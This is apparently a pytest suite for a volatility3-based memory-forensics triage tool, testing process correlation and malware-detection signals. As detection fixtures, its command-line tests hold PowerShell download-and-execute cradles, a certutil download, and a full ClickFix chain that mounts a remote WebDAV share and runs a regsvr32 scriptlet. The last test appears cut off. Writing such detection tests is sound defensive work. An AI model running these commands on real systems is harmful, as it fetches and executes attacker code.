"""Tests for reading plugin JSON and correlating it into processes.

The extractor table is the highest-risk code in the analysis phase, because a
column rename upstream turns into a silently empty entity rather than an error.
Most of what is asserted here is that a mismatch is *noticed*.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from app import analysis

FIXTURE = Path(__file__).parent / "fixtures" / "triage-sample"


@pytest.fixture
def sample(tmp_path) -> Path:
    """A copy, so a test that writes output cannot dirty the fixture."""
    destination = tmp_path / "memory"
    shutil.copytree(FIXTURE, destination)
    return destination


@pytest.fixture
def analysed(sample) -> analysis.Analysis:
    return analysis.analyse(sample)


@pytest.fixture(scope="module")
def catalogue():
    """Every plugin the installed volatility3 exposes."""
    pytest.importorskip("volatility3")
    import volatility3.framework
    import volatility3.plugins

    volatility3.framework.require_interface_version(2, 0, 0)
    volatility3.framework.import_files(volatility3.plugins, True)
    return volatility3.framework.list_plugins()


class TestRowReading:
    def test_tolerates_the_renderers_leading_newline(self, tmp_path) -> None:
        path = tmp_path / "p.json"
        path.write_text('\n[{"PID": 4}]\n')
        assert analysis.load_rows(path) == [{"PID": 4}]

    def test_an_empty_file_is_no_rows_not_an_error(self, tmp_path) -> None:
        path = tmp_path / "p.json"
        path.write_text("")
        assert analysis.load_rows(path) == []

    def test_rejects_a_document_that_is_not_a_list(self, tmp_path) -> None:
        path = tmp_path / "p.json"
        path.write_text('{"PID": 4}')
        with pytest.raises(ValueError):
            analysis.load_rows(path)

    def test_children_are_walked_and_stripped(self) -> None:
        """PsTree nests; keeping __children would nest a subtree in every finding."""
        rows = [{"PID": 1, "__children": [{"PID": 2, "__children": []}]}]
        flat = analysis.iter_rows(rows, nested=True)

        assert [r["PID"] for r in flat] == [1, 2]
        assert all("__children" not in r for r in flat)

    def test_children_are_ignored_for_flat_plugins(self) -> None:
        rows = [{"PID": 1, "__children": [{"PID": 2}]}]
        assert [r["PID"] for r in analysis.iter_rows(rows, nested=False)] == [1]


class TestOffsetColumns:
    def test_offset_is_matched_by_prefix(self) -> None:
        """PsScan builds the name as f"Offset{offsettype}" — (V) or (P)."""
        assert analysis._first_column({"Offset(P)": 1}, "Offset") == "Offset(P)"
        assert analysis._first_column({"Offset(V)": 1}, "Offset") == "Offset(V)"

    def test_netscans_offset_is_not_a_process_offset(self) -> None:
        """It identifies the connection object; using it would merge entities."""
        assert analysis.BY_PLUGIN["windows.netscan.NetScan"].offset_prefix is None

    def test_mismatched_offset_kinds_do_not_split_a_process(self) -> None:
        """--physical on one plugin must not give every process two entities."""
        rows = {
            "windows.pslist.PsList": [
                {"PID": 4180, "Offset(V)": 0xB000, "ImageFileName": "a.exe"}
            ],
            "windows.psscan.PsScan": [
                {"PID": 4180, "Offset(P)": 0x2A000, "ImageFileName": "a.exe"}
            ],
        }
        result = analysis.Analysis()
        analysis.build_entities(rows, result)

        assert len(result.processes) == 1
        assert result.processes[0].signals == set()  # signals not computed yet
        assert set(result.processes[0].seen_in) == set(rows)

    def test_pid_reuse_stays_two_entities(self) -> None:
        """Same offset kind, different offsets: two real processes."""
        rows = {
            "windows.psscan.PsScan": [
                {"PID": 4180, "Offset(V)": 0xB000, "ImageFileName": "a.exe"},
                {"PID": 4180, "Offset(V)": 0xC000, "ImageFileName": "b.exe"},
            ]
        }
        result = analysis.Analysis()
        analysis.build_entities(rows, result)

        assert len(result.processes) == 2


class TestExtractorDrift:
    def test_an_unrecognised_pid_column_is_reported_not_dropped(self) -> None:
        """A silently skipped plugin becomes a false negative."""
        result = analysis.Analysis()
        analysis.build_entities(
            {"windows.pslist.PsList": [{"ProcessId": 4180, "ImageFileName": "a.exe"}]},
            result,
        )

        assert result.processes == []
        assert len(result.notices) == 1
        assert "no recognised PID column" in result.notices[0].message
        assert "windows.pslist.PsList" in result.notices[0].message

    def test_ldrmodules_lowercase_pid_column(self) -> None:
        """The one plugin in the set that spells it 'Pid'."""
        assert analysis.BY_PLUGIN["windows.malware.ldrmodules.LdrModules"].key == "Pid"


class TestCorrelation:
    def test_one_record_per_process(self, analysed) -> None:
        assert len(analysed.processes) == 13

    def test_rows_from_every_plugin_land_on_one_entity(self, analysed) -> None:
        (target,) = analysed.by_pid(4180)
        assert {
            "windows.pslist.PsList",
            "windows.psscan.PsScan",
            "windows.cmdline.CmdLine",
            "windows.netscan.NetScan",
            "windows.malware.malfind.Malfind",
            "windows.malware.suspicious_threads.SuspiciousThreads",
        } <= set(target.seen_in)

    def test_raw_rows_are_kept_for_provenance(self, analysed) -> None:
        (target,) = analysed.by_pid(4180)
        row = target.rows("windows.malware.malfind.Malfind")[0]
        assert row["Protection"] == "PAGE_EXECUTE_READWRITE"

    def test_pstree_children_are_correlated(self, analysed) -> None:
        """svchost sits under services in the tree, not at the top level."""
        (target,) = analysed.by_pid(900)
        assert target.rows("windows.pstree.PsTree")


class TestSignals:
    def test_malfind_and_external_socket(self, analysed) -> None:
        (target,) = analysed.by_pid(4180)
        assert {"malfind", "network", "network_external", "suspicious_thread"} <= (
            target.signals
        )

    def test_an_internal_address_is_not_external(self, analysed) -> None:
        (target,) = analysed.by_pid(2100)
        assert "network" in target.signals
        assert "network_external" not in target.signals

    def test_hidden_process(self, analysed) -> None:
        (target,) = analysed.by_pid(7224)
        assert "psscan_only" in target.signals
        assert "psxview_hidden" in target.signals

    def test_a_terminated_process_is_not_hidden(self, analysed) -> None:
        """The guard the whole signal rests on.

        Windows does not zero the pool on exit, so PsScan recovers every
        recently terminated process. Without the exit-time clause this fires on
        all of them and the finding becomes noise.
        """
        (target,) = analysed.by_pid(3300)
        assert "psscan" in target.signals
        assert "exited" in target.signals
        assert "psscan_only" not in target.signals
        assert "psxview_hidden" not in target.signals

    def test_module_missing_from_one_peb_list_only(self, analysed) -> None:
        (target,) = analysed.by_pid(6000)
        assert "ldrmodules_unlinked" in target.signals

    def test_a_mapped_file_is_not_an_unlinked_module(self, analysed) -> None:
        """Absent from all three lists is a data mapping, not a hidden DLL."""
        (target,) = analysed.by_pid(2100)
        assert "ldrmodules_unlinked" not in target.signals

    def test_a_process_with_the_clr_mapped_hosts_the_dotnet_runtime(
        self, analysed
    ) -> None:
        (powershell,) = analysed.by_pid(4180)
        (explorer,) = analysed.by_pid(2100)
        assert "dotnet_runtime" in powershell.signals
        assert "dotnet_runtime" not in explorer.signals

    def test_a_malfind_region_beginning_with_mz_is_named_as_such(
        self, analysed
    ) -> None:
        """Both planted regions begin 4d 5a; only the one in a .NET process is
        the exception to the JIT explanation, but the header is a fact about
        the region either way."""
        for pid in (4180, 2100):
            (target,) = analysed.by_pid(pid)
            assert "malfind_mz" in target.signals

    def test_unusual_parent(self, analysed) -> None:
        """lsass.exe parented by powershell.exe rather than wininit.exe."""
        (target,) = analysed.by_pid(6000)
        assert "unusual_parent" in target.signals

    def test_a_correct_parent_does_not_fire(self, analysed) -> None:
        (target,) = analysed.by_pid(700)
        assert "unusual_parent" not in target.signals

    def test_an_unresolvable_parent_does_not_fire(self, analysed) -> None:
        """csrss and wininit are children of an smss that has since exited."""
        for pid in (500, 560):
            (target,) = analysed.by_pid(pid)
            assert "unusual_parent" not in target.signals

    def test_peb_masquerade(self, analysed) -> None:
        (target,) = analysed.by_pid(6000)
        assert "peb_masquerade" in target.signals

    def test_every_signal_emitted_is_in_the_vocabulary(self, analysed) -> None:
        """Each entity type may only emit signals from its own vocabulary."""
        for entity in analysed.all_entities:
            assert entity.signals <= analysis.VOCABULARY[entity.kind], entity.label

    def test_every_vocabulary_entry_has_a_source_plugin(self) -> None:
        assert set(analysis.SIGNAL_SOURCE) == analysis.ALL_SIGNALS

    def test_the_vocabularies_do_not_overlap(self) -> None:
        """Signal names are unique across types, so SIGNAL_SOURCE can stay flat."""
        total = sum(len(v) for v in analysis.VOCABULARY.values())
        assert total == len(analysis.ALL_SIGNALS)


DEFAULT_CREATED = "2026-08-15 08:00:00+00:00"


def analysed_from(processes, extra=None) -> analysis.Analysis:
    """Build a fully analysed Analysis from compact specs.

    ``processes`` holds ``(pid, ppid, name)`` or ``(pid, ppid, name, created)``.
    ``extra`` adds raw rows for any other plugin. Building directly rather than
    from the shared fixture keeps the golden expectations in test_rules.py
    meaningful: they exist to catch regressions, and would stop doing so if
    every new signal enlarged the folder they are computed from.
    """
    rows = {"windows.pslist.PsList": []}
    for spec in processes:
        pid, ppid, name = spec[:3]
        created = spec[3] if len(spec) > 3 else DEFAULT_CREATED
        rows["windows.pslist.PsList"].append({
            "PID": pid, "PPID": ppid, "ImageFileName": name,
            "Offset(V)": 0xB0000000 + pid,
            "CreateTime": created, "ExitTime": None,
        })
    rows.update(extra or {})

    result = analysis.Analysis()
    analysis.build_entities(rows, result)
    for process in result.processes:
        analysis.compute_process_signals(process, result)
    return result


def signals_of(result: analysis.Analysis, pid: int) -> set:
    (process,) = result.by_pid(pid)
    return process.signals


class TestProcessGraph:
    """Windows reuses PIDs, so a PPID is a claim about the parent, not proof."""

    def test_parent_and_children(self) -> None:
        result = analysed_from([(4, 0, "System"), (388, 4, "smss.exe"),
                                (500, 388, "csrss.exe")])
        (smss,) = result.by_pid(388)

        assert result.parent(smss).pid == 4
        assert [c.pid for c in result.children(smss)] == [500]

    def test_ancestors_are_nearest_first(self) -> None:
        result = analysed_from([
            (100, 0, "a.exe"), (200, 100, "b.exe"), (300, 200, "c.exe"),
        ])
        (leaf,) = result.by_pid(300)

        assert [p.pid for p in result.ancestors(leaf)] == [200, 100]

    def test_descendants_reach_the_whole_subtree(self) -> None:
        result = analysed_from([
            (100, 0, "a.exe"), (200, 100, "b.exe"), (300, 200, "c.exe"),
        ])
        (root,) = result.by_pid(100)

        assert sorted(p.pid for p in result.descendants(root)) == [200, 300]

    def test_a_parent_younger_than_its_child_is_rejected(self) -> None:
        """The signature of a reused PID: the real parent exited and something
        newer inherited the number. Treating it as the parent would attribute a
        chain to a process that never launched anything."""
        result = analysed_from([
            (900, 0, "services.exe", "2026-08-15 08:00:00+00:00"),
            (4180, 900, "powershell.exe", "2026-08-15 08:00:00+00:00"),
            # Same PID as the parent above, created after the child.
        ])
        rows = {"windows.psscan.PsScan": [{
            "PID": 900, "PPID": 0, "ImageFileName": "impostor.exe",
            "Offset(V)": 0xDEAD, "CreateTime": "2026-08-15 09:00:00+00:00",
            "ExitTime": None,
        }]}
        result = analysed_from(
            [(900, 0, "services.exe"), (4180, 900, "powershell.exe")], rows
        )
        (child,) = result.by_pid(4180)

        # Two candidates for PID 900 now; the younger one cannot be the parent,
        # leaving exactly one plausible answer.
        assert len(result.by_pid(900)) == 2
        assert result.parent(child).name == "services.exe"

    def test_an_ambiguous_parent_resolves_to_nothing(self) -> None:
        """Two equally plausible candidates: guessing would be worse than
        reporting nothing."""
        rows = {"windows.psscan.PsScan": [{
            "PID": 900, "PPID": 0, "ImageFileName": "other.exe",
            "Offset(V)": 0xDEAD, "CreateTime": DEFAULT_CREATED, "ExitTime": None,
        }]}
        result = analysed_from(
            [(900, 0, "services.exe"), (4180, 900, "powershell.exe")], rows
        )
        (child,) = result.by_pid(4180)

        assert result.parent(child) is None

    def test_a_self_parented_process_does_not_loop(self) -> None:
        result = analysed_from([(100, 100, "weird.exe")])
        (target,) = result.by_pid(100)

        assert result.parent(target) is None
        assert result.ancestors(target) == []

    def test_a_parent_cycle_terminates(self) -> None:
        """Reuse can produce a ring. The walk must bound itself."""
        result = analysed_from([(100, 200, "a.exe"), (200, 100, "b.exe")])
        (target,) = result.by_pid(100)

        chain = result.ancestors(target)
        assert len(chain) <= analysis.Analysis.MAX_ANCESTRY_DEPTH
        assert [p.pid for p in chain] == [200]


class TestImplausibleProcesses:
    """Pool scanning recovers anything shaped like an _EPROCESS, and on a
    multi-gigabyte image some hits are coincidence.

    A real capture produced one: name "\\", PPID 3,014,702, 7,143,525 threads.
    It satisfied every clause of psscan_only — in PsScan, absent from PsList, no
    exit time — became a high-severity finding, and sent eight follow-up plugins
    to search a 25 GB image for a process that never existed. Fifteen minutes of
    scanning returned empty files.
    """

    GARBAGE = {
        "PID": 8, "PPID": 3014702, "ImageFileName": "\\",
        "Threads": 7143525, "Offset(V)": 253490878726408,
        "CreateTime": "2026-08-14T19:26:20+00:00", "ExitTime": None,
    }

    def test_the_real_carved_row_is_rejected(self) -> None:
        assert analysis.implausible_process(self.GARBAGE) is not None

    @pytest.mark.parametrize("field,value", [
        ("ImageFileName", "\\"),
        ("ImageFileName", "a/b"),
        ("Threads", 7143525),
        ("PID", 99999999),
        ("PPID", 99999999),
    ])
    def test_each_impossibility_alone_is_enough(self, field, value) -> None:
        row = {"PID": 900, "PPID": 660, "ImageFileName": "svchost.exe", "Threads": 12}
        row[field] = value
        assert analysis.implausible_process(row) is not None

    def test_a_merely_improbable_ppid_is_allowed(self) -> None:
        """The captured row's PPID of 3,014,702 is absurd but below the ceiling
        Windows allocates from, so it is not impossible. The row is rejected on
        its name and thread count instead. Tightening this to catch it — PIDs
        are in practice multiples of four — would trade a certain false negative
        for a cosmetic gain, and a discarded real process is the expensive
        direction to be wrong in."""
        row = {"PID": 900, "PPID": 3014702, "ImageFileName": "svchost.exe",
               "Threads": 12}
        assert analysis.implausible_process(row) is None

    @pytest.mark.parametrize("row", [
        {"PID": 4, "PPID": 0, "ImageFileName": "System", "Threads": 180},
        {"PID": 900, "PPID": 660, "ImageFileName": "svchost.exe", "Threads": 12},
        # Bounds are loose on purpose: unusual must still pass.
        {"PID": 31337, "PPID": 4, "ImageFileName": "weird-name.exe", "Threads": 4000},
        # Missing columns must not be treated as impossible values.
        {"PID": 900, "ImageFileName": None, "Threads": None, "PPID": None},
    ])
    def test_real_processes_survive(self, row) -> None:
        assert analysis.implausible_process(row) is None

    def test_it_never_becomes_an_entity(self) -> None:
        result = analysis.Analysis()
        analysis.build_entities({"windows.psscan.PsScan": [
            self.GARBAGE,
            {"PID": 900, "PPID": 660, "ImageFileName": "svchost.exe",
             "Threads": 12, "Offset(V)": 0xB000},
        ]}, result)

        assert [p.pid for p in result.processes] == [900]

    def test_the_discard_is_reported_not_silent(self) -> None:
        """A real process dropped here would be a false negative, so the
        analyst is told what went and why."""
        result = analysis.Analysis()
        analysis.build_entities(
            {"windows.psscan.PsScan": [self.GARBAGE]}, result
        )

        (notice,) = [n for n in result.notices if "Discarded" in n.message]
        assert "PID 8" in notice.message
        assert notice.level == "info"


class TestUnresolvedModuleScope:
    def test_a_placeholder_supplies_no_scope(self) -> None:
        """<unresolved> is not a module name. Passing it through sent Modules
        and ModScan to search a 25 GB image for a driver called "<unresolved>",
        taking fifteen minutes to return nothing."""
        assert analysis.Module(key=analysis.UNRESOLVED).scope_values() == {}

    def test_a_real_module_still_scopes_by_name(self) -> None:
        module = analysis.Module(key="wdf01000", scope_name="Wdf01000.sys")
        assert module.scope_values() == {"name": "Wdf01000.sys"}


class TestExpectedParents:
    def test_the_session_instance_of_smss_is_normal(self) -> None:
        """Regression: the master smss spawns one copy of itself per session.

        Allowing only System as smss's parent fired on every session the host
        had ever created — two on a real capture, both long exited — which is
        noise on exactly the table that is kept short to avoid it.
        """
        result = analysed_from([
            (4, 0, "System"),
            (1732, 4, "smss.exe"),       # master
            (1964, 1732, "smss.exe"),    # session instance
        ])

        assert "unusual_parent" not in signals_of(result, 1964)
        assert "unusual_parent" not in signals_of(result, 1732)

    def test_smss_parented_by_something_else_still_fires(self) -> None:
        result = analysed_from([
            (2100, 900, "explorer.exe"), (1964, 2100, "smss.exe"),
        ])
        assert "unusual_parent" in signals_of(result, 1964)


class TestDerivedDetails:
    def test_sessions_keys_on_its_own_column(self) -> None:
        """Sessions spells it 'Process ID'; every other process plugin uses
        'PID'. Reading it wrongly yields an entity with no session at all."""
        assert analysis.BY_PLUGIN["windows.sessions.Sessions"].key == "Process ID"

    def test_session_and_user_are_lifted(self) -> None:
        result = analysed_from(
            [(900, 660, "svchost.exe")],
            {"windows.sessions.Sessions": [{
                "Process ID": 900, "Session ID": 0, "Process": "svchost.exe",
                "User Name": "NT AUTHORITY/SYSTEM", "Session Type": "",
                "Create Time": DEFAULT_CREATED,
            }]},
        )
        (target,) = result.by_pid(900)

        assert target.session_id == 0
        assert target.user_name == "NT AUTHORITY/SYSTEM"

    def test_the_image_path_comes_from_the_kernel_not_the_peb(self) -> None:
        """PebMasquerade exists because the PEB path can be rewritten by the
        process. Believing it here would trust the lie the plugin exposes."""
        result = analysed_from(
            [(6000, 4180, "lsass.exe")],
            {"windows.malware.pebmasquerade.PebMasquerade": [{
                "PID": 6000, "EPROCESS_ImageFileName": "lsass.exe",
                "EPROCESS_SeAudit_ImageFileName":
                    "\\Device\\HarddiskVolume5\\Users\\bob\\lsass.exe",
                "PEB_ImageFilePath": "C:\\Windows\\System32\\lsass.exe",
                "PEB_ImageFilePath_Spoofed": True,
                "PEB_CommandLine_Spoofed": False,
            }]},
        )
        (target,) = result.by_pid(6000)

        assert target.image_path == "\\users\\bob\\lsass.exe"

    def test_the_device_prefix_is_stripped(self) -> None:
        assert analysis.normalise_path(
            "\\Device\\HarddiskVolume5\\Windows\\System32\\lsass.exe"
        ) == "\\windows\\system32\\lsass.exe"


class TestImageAndContextSignals:
    def _with_path(self, name, path, pid=900):
        return analysed_from(
            [(pid, 660, name)],
            {"windows.malware.pebmasquerade.PebMasquerade": [{
                "PID": pid, "EPROCESS_ImageFileName": name,
                "EPROCESS_SeAudit_ImageFileName": path,
                "PEB_ImageFilePath_Spoofed": False,
                "PEB_CommandLine_Spoofed": False,
            }]},
        )

    def test_a_system_binary_outside_system32(self) -> None:
        result = self._with_path(
            "svchost.exe", "\\Device\\HarddiskVolume5\\Users\\bob\\svchost.exe"
        )
        signals = signals_of(result, 900)

        assert "system_process_wrong_path" in signals
        assert "user_writable_image" in signals

    def test_the_correct_path_does_not_fire(self) -> None:
        result = self._with_path(
            "svchost.exe", "\\Device\\HarddiskVolume5\\Windows\\System32\\svchost.exe"
        )
        assert "system_process_wrong_path" not in signals_of(result, 900)

    def test_syswow64_is_legitimate_for_svchost(self) -> None:
        result = self._with_path(
            "svchost.exe", "\\Device\\HarddiskVolume5\\Windows\\SysWOW64\\svchost.exe"
        )
        assert "system_process_wrong_path" not in signals_of(result, 900)

    def test_an_ordinary_application_under_a_profile_is_not_flagged(self) -> None:
        """Applications live under a user profile constantly. Flagging them
        would bury the system binary that matters."""
        result = self._with_path(
            "slack.exe", "\\Device\\HarddiskVolume5\\Users\\bob\\slack.exe", pid=7000
        )
        signals = signals_of(result, 7000)

        assert "system_process_wrong_path" not in signals
        assert "user_writable_image" not in signals

    def _with_session(self, name, session, user="NT AUTHORITY/SYSTEM"):
        return analysed_from(
            [(900, 660, name)],
            {"windows.sessions.Sessions": [{
                "Process ID": 900, "Session ID": session, "Process": name,
                "User Name": user, "Session Type": "", "Create Time": DEFAULT_CREATED,
            }]},
        )

    def test_svchost_in_an_interactive_session(self) -> None:
        assert "system_process_wrong_session" in signals_of(
            self._with_session("svchost.exe", 2), 900
        )

    def test_svchost_in_session_zero_is_correct(self) -> None:
        assert "system_process_wrong_session" not in signals_of(
            self._with_session("svchost.exe", 0), 900
        )

    def test_csrss_is_exempt_from_the_session_check(self) -> None:
        """One csrss exists per interactive session, so a non-zero session is
        correct and flagging it would fire on every healthy host."""
        assert "system_process_wrong_session" not in signals_of(
            self._with_session("csrss.exe", 2), 900
        )

    def test_lsass_running_as_a_user(self) -> None:
        result = self._with_session("lsass.exe", 0, user="CORP/jdoe")
        assert "system_process_wrong_user" in signals_of(result, 900)

    def test_lsass_as_system_is_correct(self) -> None:
        result = self._with_session("lsass.exe", 0, user="NT AUTHORITY/SYSTEM")
        assert "system_process_wrong_user" not in signals_of(result, 900)

    def test_svchost_may_run_as_a_service_account(self) -> None:
        result = self._with_session("svchost.exe", 0, user="NT AUTHORITY/LOCAL SERVICE")
        assert "system_process_wrong_user" not in signals_of(result, 900)


class TestCommandLineSignals:
    def _with_args(self, args, name="powershell.exe"):
        return analysed_from(
            [(4180, 2100, name)],
            {"windows.cmdline.CmdLine": [
                {"PID": 4180, "Process": name, "Args": args}
            ]},
        )

    def test_encoded_command(self) -> None:
        payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAA=="
        for flag in ("-e", "-enc", "-EncodedCommand"):
            result = self._with_args(f"powershell.exe {flag} {payload}")
            assert "encoded_command" in signals_of(result, 4180), flag

    def test_execution_policy_is_not_an_encoded_command(self) -> None:
        """-ExecutionPolicy shares the -e prefix. The base64 payload is what
        separates them, and Bypass is not one."""
        result = self._with_args("powershell.exe -ExecutionPolicy Bypass -File x.ps1")
        assert "encoded_command" not in signals_of(result, 4180)

    def test_an_ordinary_command_line_is_quiet(self) -> None:
        result = self._with_args("C:\\Windows\\System32\\svchost.exe -k netsvcs",
                                 name="svchost.exe")
        signals = signals_of(result, 4180)

        assert "encoded_command" not in signals
        assert "suspicious_command_line" not in signals

    @pytest.mark.parametrize("args", [
        "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
        "powershell -w hidden -c whoami",
        "net use Z: \\\\host.example@SSL\\share",
        "regsvr32 /s /n /u /i:Z:\\poc.sct scrobj.dll",
        "powershell ([wmiclass]'Win32_Process').Create('calc')",
        "certutil -urlcache -split -f http://x/y.exe",
    ])
    def test_known_techniques_are_matched(self, args) -> None:
        assert "suspicious_command_line" in signals_of(self._with_args(args), 4180)

    def test_the_reason_is_available_for_the_report(self) -> None:
        """"Suspicious command line" alone tells an examiner nothing to write
        down."""
        result = self._with_args("net use Z: \\\\host@SSL\\d3f8")
        (target,) = result.by_pid(4180)

        reasons = analysis.command_line_reasons(target)
        assert any("WebDAV" in r for r in reasons)


class TestLineageSignals:
    def test_a_proxy_parent_is_flagged(self) -> None:
        result = analysed_from([
            (2100, 900, "explorer.exe"),
            (5100, 2100, "pcalua.exe"),
            (4180, 5100, "powershell.exe"),
        ])
        assert "lolbin_proxy_parent" in signals_of(result, 4180)

    def test_wmi_created_processes_are_named_as_such(self) -> None:
        result = analysed_from([
            (1000, 900, "WmiPrvSE.exe"),
            (8340, 1000, "regsvr32.exe"),
        ])
        signals = signals_of(result, 8340)

        assert "lolbin_proxy_parent" in signals
        assert "wmi_spawned_process" in signals

    def test_an_ordinary_parent_is_not_a_proxy(self) -> None:
        result = analysed_from([
            (2100, 900, "explorer.exe"), (4180, 2100, "powershell.exe"),
        ])
        assert "lolbin_proxy_parent" not in signals_of(result, 4180)

    def test_office_ancestry_survives_an_intermediate_loader(self) -> None:
        """The reason this is ancestry and not the immediate parent."""
        result = analysed_from([
            (2716, 2100, "WINWORD.EXE"),
            (3000, 2716, "loader.exe"),
            (4832, 3000, "powershell.exe"),
        ])
        assert "office_spawned_shell" in signals_of(result, 4832)

    def test_a_shell_with_no_office_ancestor_is_quiet(self) -> None:
        result = analysed_from([
            (2100, 900, "explorer.exe"), (4832, 2100, "powershell.exe"),
        ])
        assert "office_spawned_shell" not in signals_of(result, 4832)

    def test_browser_spawned_shell(self) -> None:
        result = analysed_from([
            (2200, 2100, "msedge.exe"), (4832, 2200, "cmd.exe"),
        ])
        assert "browser_spawned_shell" in signals_of(result, 4832)

    def test_script_engine_spawning_a_signed_proxy(self) -> None:
        result = analysed_from([
            (2100, 900, "explorer.exe"),
            (5200, 2100, "wscript.exe"),
            (8340, 5200, "regsvr32.exe"),
        ])
        assert "script_engine_spawned_lolbin" in signals_of(result, 8340)

    def test_the_clickfix_chain_is_caught_despite_two_lineage_breaks(self) -> None:
        """The intrusion this project was built for.

        explorer -> pcalua -> powershell, then WMI creates regsvr32 so its
        parent becomes WmiPrvSE. Both breaks defeat a rule that walks ancestry
        for a known-bad pair; the proxy-parent signal does not care, because it
        looks at what the parent *is* rather than what it claims to descend from.
        """
        command = (
            "pcalua.exe -a powershell -c \"Start-Service WebClient;"
            "net use Z: \\\\rechapman.duckdns.org@SSL\\d3f8a142c9;"
            "([wmiclass]'Win32_Process').Create('regsvr32 /s /n /u /i:Z:\\poc.sct "
            "scrobj.dll',$null,$null)\""
        )
        result = analysed_from(
            [
                (2100, 900, "explorer.exe"),
                (5100, 2100, "pcalua.exe"),
                (21916, 5100, "powershell.exe"),
                (1000, 900, "WmiPrvSE.exe"),
                (8340, 1000, "regsvr32.exe"),
            ],
            {"windows.cmdline.CmdLine": [
                {"PID": 21916, "Process": "powershell.exe", "Args": command}
            ]},
        )

        shell = signals_of(result, 21916)
        payload = signals_of(result, 8340)

        assert "lolbin_proxy_parent" in shell
        assert "suspicious_command_line" in shell
        assert "lolbin_proxy_parent" in payload
        assert "wmi_spawned_process" in payload


class TestDotNetAndMzSignals:
    """The two facts that make a malfind hit self-explaining: does the process
    host a JIT, and does the region begin with a PE header."""

    MALFIND = "windows.malware.malfind.Malfind"
    LDR = "windows.malware.ldrmodules.LdrModules"

    def region(self, **overrides) -> dict:
        row = {"PID": 100, "Process": "app.exe", "Start VPN": 0x1F0000,
               "End VPN": 0x1F0FFF, "Hexdump": "4d 5a 90 00", "Notes": None}
        row.update(overrides)
        return row

    def module(self, path: str) -> dict:
        return {"Pid": 100, "Process": "app.exe", "Base": 0x7FF000000000,
                "InLoad": True, "InInit": True, "InMem": True, "MappedPath": path}

    def signals(self, malfind=(), ldr=()) -> set:
        rows = {self.MALFIND: list(malfind), self.LDR: list(ldr)}
        return signals_of(analysed_from([(100, 4, "app.exe")], rows), 100)

    def test_mz_is_read_from_the_hexdump(self) -> None:
        assert "malfind_mz" in self.signals(malfind=[self.region()])

    def test_a_function_prologue_is_not_mz(self) -> None:
        found = self.signals(malfind=[self.region(Hexdump="55 48 8b ec 48 83")])
        assert "malfind" in found
        assert "malfind_mz" not in found

    def test_the_hexdump_may_be_packed_or_upper_case(self) -> None:
        assert "malfind_mz" in self.signals(malfind=[self.region(Hexdump="4D5A9000")])

    def test_malfinds_own_verdict_is_the_fallback(self) -> None:
        """A row whose hexdump did not render still carries the Notes column."""
        row = self.region(Hexdump="N/A", Notes="MZ header")
        assert "malfind_mz" in self.signals(malfind=[row])

    def test_a_missing_hexdump_and_no_verdict_is_not_mz(self) -> None:
        row = self.region(Hexdump=None, Notes=None)
        assert "malfind_mz" not in self.signals(malfind=[row])

    @pytest.mark.parametrize("path", [
        "\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
        "\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\mscorwks.dll",
        "\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\8.0.4\\coreclr.dll",
        "\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CLRJIT.DLL",
    ])
    def test_each_runtime_generation_is_recognised(self, path) -> None:
        assert "dotnet_runtime" in self.signals(ldr=[self.module(path)])

    def test_the_shim_alone_is_not_a_runtime(self) -> None:
        """mscoree.dll decides whether to load a runtime; plenty of processes
        carry it for a COM call that never JITs anything."""
        found = self.signals(ldr=[self.module("\\Windows\\System32\\mscoree.dll")])
        assert "dotnet_runtime" not in found

    def test_a_native_module_is_not_a_runtime(self) -> None:
        found = self.signals(ldr=[self.module("\\Windows\\System32\\ntdll.dll")])
        assert "dotnet_runtime" not in found

    def test_the_runtime_is_found_whatever_the_peb_lists_say(self) -> None:
        """LdrModules reports the mapped file from the VAD, so an unlinked
        runtime still counts — the point is whether a JIT is present."""
        module = self.module("\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll")
        module.update(InLoad=False, InInit=False)
        assert "dotnet_runtime" in self.signals(ldr=[module])

    def test_neither_signal_without_its_plugin(self) -> None:
        found = self.signals()
        assert not found & {"malfind", "malfind_mz", "dotnet_runtime"}

    def test_the_helpers_hand_back_the_rows_that_matter(self) -> None:
        """The report cites these, so they must be the MZ row and the runtime
        row rather than whichever came first."""
        rows = {
            self.MALFIND: [self.region(Hexdump="55 48 8b ec", **{"Start VPN": 0x100000}),
                           self.region()],
            self.LDR: [self.module("\\Windows\\System32\\ntdll.dll"),
                       self.module("\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll")],
        }
        result = analysed_from([(100, 4, "app.exe")], rows)
        (process,) = result.by_pid(100)

        assert [analysis.region_start(r) for r in analysis.mz_regions(process)] == ["0x1f0000"]
        (runtime,) = analysis.clr_modules(process)
        assert runtime["MappedPath"].endswith("clr.dll")


class TestExternalAddresses:
    @pytest.mark.parametrize(
        "address", ["10.0.0.1", "192.168.1.5", "127.0.0.1", "169.254.3.1",
                    "172.16.4.4", "0.0.0.0", "::1", "fe80::1", "", None, "*"]
    )
    def test_not_external(self, address) -> None:
        assert not analysis._is_external(address)

    @pytest.mark.parametrize("address", ["93.184.216.34", "1.1.1.1", "2606:4700::1111"])
    def test_external(self, address) -> None:
        assert analysis._is_external(address)


class TestGuidance:
    def test_csv_only_folder_says_how_to_fix_it(self, tmp_path) -> None:
        (tmp_path / "windows.pslist.PsList.csv").write_text("PID\n4\n")
        result = analysis.analyse(tmp_path)

        assert [n.level for n in result.notices] == ["error"]
        message = result.notices[0].message

        # The cheapest fix first: analysis reads JSON, so --format json alone
        # unblocks it. Leading with csv,json asked for a second full pass over
        # the image to produce output nothing here reads.
        assert "--format json" in message
        assert message.index("--format json") < message.index("--format csv,json")

    def test_an_empty_folder_is_reported(self, tmp_path) -> None:
        result = analysis.analyse(tmp_path)
        assert any(n.level == "error" for n in result.notices)

    def test_a_missing_plugin_names_its_log_and_a_rerun(self, analysed) -> None:
        assert "windows.netstat.NetStat" in analysed.plugins_missing
        message = "\n".join(n.message for n in analysed.notices)
        assert "windows.netstat.NetStat" in message
        assert "--plugins windows.netstat.NetStat" in message

    def test_all_zero_rows_warns_the_layer_did_not_map(self, tmp_path) -> None:
        for extractor in analysis.EXTRACTORS:
            (tmp_path / f"{extractor.plugin}.json").write_text("[]")
